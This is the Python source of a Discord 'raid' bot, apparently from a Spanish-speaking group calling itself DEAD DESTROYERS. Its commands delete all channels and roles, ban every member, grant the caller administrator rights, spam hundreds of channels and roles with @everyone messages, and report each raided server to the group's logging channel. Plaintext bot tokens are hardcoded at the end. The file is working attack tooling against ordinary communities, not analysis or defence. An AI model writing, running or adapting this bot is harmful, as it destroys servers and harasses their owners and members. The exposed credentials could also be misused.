
xd

import discord
from discord.ext import commands
from discord.ext import tasks



intents = discord.Intents().all()
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')

#lee la consola
# El token es invalido


@bot.command(aliases=["test"])
@commands.cooldown(1, 30, commands.BucketType.user)
async def TEST(ctx):
    await ctx.send("Wazaa")


@bot.event
async def on_ready():
    print("Online")
    myLoop.start()
    await bot.change_presence(activity=discord.Game(name="V3.3 | .help"))


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(
            f"Tu y/o el servidor estan en un cooldown de 10 minutos** Faltan:  {round(error.retry_after, 2)} ")


@bot.command(aliases=["dead"])
@commands.cooldown(1, 600, commands.BucketType.user)
@commands.cooldown(1, 600, commands.BucketType.guild)
async def kill(ctx):

    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await ctx.guild.edit(name="DD IS HERE")
            await ctx.guild.edit(icon_url="https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif"
            )
        except:
            pass
    for _i in range(1):
        await ctx.guild.create_text_channel(name="unete-a-dd")
    logg = bot.get_channel(1021099587202723890)
    server = ctx.guild.name
    user = ctx.author
    command = ctx.command
    invite = await ctx.channel.create_invite(max_age = 0)
    log =discord.Embed(title="Toca aqui para unirte al servidor", url=invite, description="Si no puedes entrar es porque expiro la invitacion")  
    log.add_field(name='Usuario Que raideo', value=f'{ctx.author.name}', inline=False)
    log.add_field(name='Nombre del servidor', value=f'{ctx.guild.name}', inline=False) 
    log.add_field(name='Miembros', value=f'{ctx.guild.member_count}', inline=False)
    log.add_field(name='Owner', value=f'{ctx.message.guild.owner}', inline=False)
    await logg.send(embed=log) 

    for _i in range(400):
        await ctx.guild.create_text_channel(
            name="r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷")




@bot.event
async def on_guild_channel_create(channel):
    if (channel.name == 'r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷'):
        for _i in range(10):
            await channel.send(
                '> ||@everyone||                                                                                                                                         **__Raided By DEAD DESTROYERS__**   | https://discord.gg/Q9fac9jkaF | https://imgur.com/a/pkewvSu'
            )

    if channel.name == "unete-a-dd":
        for _i in range(1):
            await channel.send(
                '> ||@everyone||                                                                                                                                         **__Unete a DD para recuperar tu servidor y usar este bot__** | https://discord.gg/Q9fac9jkaF'
            )



@bot.command()
async def bye(ctx):
    await ctx.send("@everyone Adios xd")
    await ctx.guild.leave()
   
@bot.command()
async def banall(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"BANNED {user}")
        except:
           pass
    



@bot.command(pass_context=True)
@commands.cooldown(1, 600, commands.BucketType.user)
async def admin(ctx):
    await ctx.message.delete()
    try:
        guild = ctx.guild
        role = await guild.create_role(name="DD Admin",
                                       permissions=discord.Permissions(8),
                                       colour=discord.Colour(000000))
        authour = ctx.message.author
        await authour.add_roles(role)
    except:
        pass


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
async def droles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    await ctx.message.delete()


@bot.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(colour=discord.Colour.red())

    embed.set_author(name='El poder de DDBOT')
    embed.add_field(name='<a:_:1012466114183319592> .banall',
                    value='Banea a todos en el servidor',
                    inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .admin', value='Te otorga admin', inline=False)
    embed.add_field(
        name='<a:_:1012466114183319592> .kill',
        value='Elimina todos los canales y crea nuevos con spam',
    )

    embed.add_field(name='<a:_:1012466114183319592> .droles',
                    value='Elimina todos los roles',
                    inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .croles', value='Crea muchos roles', inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .bye', value='Termina el raid y abandona el servidor', inline=False)


    await ctx.send(embed=embed)


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
@commands.cooldown(1, 600, commands.BucketType.guild)
async def croles(ctx):
    await ctx.message.delete()
    for _i in range(100):
        await ctx.guild.create_role(name="#DD")




whitelist = [
    # discord guild ids you don't want to leave
    1021098907071156285,
    982743744300339271
]


@tasks.loop(seconds=3600) # repeat after every 10 seconds
async def myLoop():
 for guild in bot.guilds:
        try:
            if guild.id not in whitelist:
                server = bot.get_guild(guild.id)
                await server.leave()
        except:
                     pass



bot.run("MTAyMDQxNzM0NDEzNDIwNTU0MA.GkJmIM.7U-QRC6TFv0CHgtz40EqtBe9wHOpgDsYC5f8pk")#incognito pdorias poner un sistema de logs?
#MTAyMDc0NzM3NTY2MjM0NjI1MA.GBcn45.gZeNMyqzwBgecf6HwE8Jw95hdGh4WLuwEuwXVQ
